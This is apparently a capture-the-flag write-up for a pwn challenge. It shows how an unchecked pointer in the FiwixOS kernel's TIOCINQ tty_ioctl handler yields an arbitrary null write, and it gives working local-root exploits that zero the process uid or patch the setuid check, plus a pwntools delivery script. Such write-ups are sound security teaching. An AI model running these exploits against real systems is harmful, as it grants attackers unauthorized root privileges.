# h_wix_p

## TL; DR
- Abuse an arbitrary null byte write in FiwixOS' `tty_ioctl` to set `current.uid == 0` to achieve root privileges 

## Challenge Description

> Finally, a proper Linux version.

- Category: **pwn**

## Exploitation

### Finding the vulnerability

- When analyzing the provided challenge files we cannot locate a specific binary or kernel module to exploit. But in `run.sh` we can see it uses the file `fiwix` as a kernel, and it is being set up by the `build-challenge.sh` script, that downloads the latest version of FiwixOS from the official website **https://www.fiwix.org/FiwixOS-3.5-i386.raw.gz**. 

> Fiwix is an operating system kernel written from scratch, based on the UNIX architecture and fully focused on being Linux-i386 compatible (Linux 2.0 and 2.2 versions mostly). It is designed and developed mainly as a hobby OS and, since it serves also for educational purposes, the kernel code is kept as simple as possible for the benefit of students and OS enthusiasts. It is small in size (less than 50K lines of code), runs only on the i386 hardware platform and is compatible with a good base of existing GNU applications

- At the downloads page we find this message: 
> WARNING: the kernel and the software included might contain (un)known bugs and vulnerabilities.
USE AT YOUR OWN RISK!

- So the first thing we do is check the [changelog page](https://www.fiwix.org/news.html) for any known unfixed bugs. For the latest version 1.7.0, there were a lot of additions but we can highlight **- Added support for the command TIOCINQ in tty_ioctl().** Since the code is open we can read the new implementation by downloading the official [source code](https://www.fiwix.org/fiwix-1.7.0.tar.bz2).

- In the file ``tty.c`` we find the TIOCINQ (0x541b) implementation inside the `tty_ioctl` function

```c
case TIOCINQ:
		{
			int *val = (int *)arg;
			if(tty->termios.c_lflag & ICANON) {
				*val = tty->cooked_q.count;
			} else {
				*val = tty->read_q.count;
			}
			break;
		}

```

- There is a function used in a lot of switch cases of the same file that checks if an address is valid

```c

int check_user_area(int type, const void *addr, unsigned int size)
{
	return verify_address(type, addr, size);
}

```

- As we can see it is not verifying if the address is valid in TIOCINQ, so whatever value gets sent via `arg` will be the address where `read_q.count` or `cooked_q.count` will be written. `read_q` stores raw bytes from a `read` syscall, including keyboard interrupts, and `cooked_q` contains the processed input. 

- Knowing this we can try to perform an `ioctl` on an open tty to try and write an unknown value to an address of our choice. We will compile this small .c code to test it:

```c
#define TIOCINQ 0x541b

int32_t main(int argc, char **argv){
    
    int fd = open("/dev/tty", O_RDWR);
    ioctl(fd, TIOCINQ, 0xdeadbeef);

    return 0;
}

```

![alt text](assets/crash.png)

- We see an instant crash. We will add now the parameter `-s` to the qemu start script so we can debug this `tty_ioctl` function. To make sure we can place our breakpoint at TIOCINQ implementation, we will decompile the kernel with Ghidra to find the specific offset. 

![alt text](assets/ghidra.png)

- After placing our breakpoint:

![alt text](assets/gdb.png)

- It is trying to write 0 to the address 0xdeadbeef! So now we know the value getting written. This could have been told by looking at the code and understanding that the function writes the number of bytes inside the data queue, but I always prefer to debug it just in case there were bytes inside.

### Exploiting the vulnerability

- There is a var `current` that is getting accessed all the time by the different modules, this struct keeps track of the current process relevant data. 

```c
struct proc {
    ...snip...
	unsigned short int uid;		/* real user ID */
	unsigned short int gid;		/* real group ID */
	unsigned short int euid;	/* effective user ID */
	unsigned short int egid;	/* effective group ID */
	...snip...
};

```

- These values are stored to a fixed offset of the start of `current` and its address is constant too! To check the specific offset to the UID field we read the decompilation of the syscall `sys_getuid`: 

```c
undefined2 sys_getuid(void)
{
  return *(undefined2 *)(current + 0x2120);
}

```

- Fiwix does not have a lot of the modern software security implementations such as SMAP, SMEP, KASLR, etc. so **every page is RWX** and the addresses can be predictable, we will use this to our advantage to read the address from `current` and write into it with offset 0x2120. By using the same breakpoint we placed earlier, we can leak the address:

```console
pwndbg> x &current
0xc0144bf8 <current>:	0xc01b1290
```

- Our final exploit will be:

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>

#define CURRENT 0xc01b1290
#define TIOCINQ 0x541b

int32_t main(int argc, char **argv){
	
	int fd = open("/dev/tty", O_RDWR);

	ioctl(fd, TIOCINQ, CURRENT+0x2120);
	
	if (getuid() == 0){
		printf("win win\n");
		system("cat /flag.txt");
	} 

	return 0;	
}
```

- We send it to the remote instance with python

```python
from pwn import *
import base64

context.log_level = 'warning'

r = remote("207.154.246.93", 13370)

def pow_solve():
	r.recvuntil(b'unhex("')

	num = r.recvline().split(b'"')[0]

	print(f"[*] Retrieved num: {num}")

	result = subprocess.run(
	    ["./pow-solver", "30", num.decode()], 
	    capture_output=True, 
	    text=True
	)

	if result.returncode == 0:
	    pow_result = result.stdout.strip()
	    print(f"[*] Result: {pow_result}")
	else:
	    print(f"Error: {result.stderr}")
	    sys.exit(1)

	print(f"[+] Sending {pow_result.encode()}")
	r.sendline(pow_result.encode())

pow_solve()

print(f"[*] Proof-of-Work solved! Sending exploit...")

r.recvuntil(b'login: ')
r.sendline(b'hxp')
r.recvuntil(b'Password: ')
r.sendline(b'hxp')

with open("marc.c", "rb") as f:
	data = f.read()
	out = base64.b64encode(data).decode('utf-8')
	r.sendlineafter(b'$', f'echo "{out}" | base64 -d > /tmp/main.c'.encode())
	f.close()

r.sendlineafter(b'$', b'gcc /tmp/main.c -o /tmp/win')
r.sendlineafter(b'$', b'/tmp/win')

r.interactive()
```

### Flag by patching the kernel

- As we stated earlier, all the pages have RWX permissions so a teammate developed a different approach involving writing 0 null bytes into a specific offset of the `sys_setuid` implementation. There is a specific `CMP word ptr [EAX + 0x2124],0x0` instruction in the code, that checks if the user who called the function has gid = 0.

```c
  if (current.gid == 0) { // <-- This is the check
    current.euid = param_1;
    current.uid = param_1;
  }
```

- The bytes for this instruction are ``66 83 b8 24 21 00 00 00``, by zeroing out the bytes after `66`, the instructions change, the check disappears thus letting us set any value for ``current.uid``.

```nasm
0:  66 00 00                data16 add BYTE PTR [eax],al
3:  00 00                   add    BYTE PTR [eax],al
5:  00 00                   add    BYTE PTR [eax],al
7:  00                      .byte 0x0
```

- Another approach we found that involved patching the kernel was instead of zeroing out after the byte `66`, we would zero out from `b8` so the instruction instead of being `CMP word ptr [EAX + 0x2124],0x0` would do the comparison with `CMP word ptr [EAX],0x0`. Remember EAX here is always `current` and looking at GDB it would always point to NULL data at its first field.

- These approaches worked consistently to achieve LPE on the remote instance.

```c

#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdlib.h>

#define TIOCINQ 0x541b
#define ADDR 0xc010e5cc // 0x5cc for first approach, 0x5ce for second

int main() {

        int fd = open("/dev/tty", O_RDWR);
        if (ioctl(fd, TIOCINQ, ADDR) < 0){
                printf("[-] ioctl error\n");
        }

        setuid(0);

        if (getuid() == 0){
                printf("[*] success! enjoy root shell\n");
                system("/bin/sh");
        } else {
                printf("[-] exploit did not work\n");
        }
        
}

```

### Getting the flag

![flag](assets/win.gif)
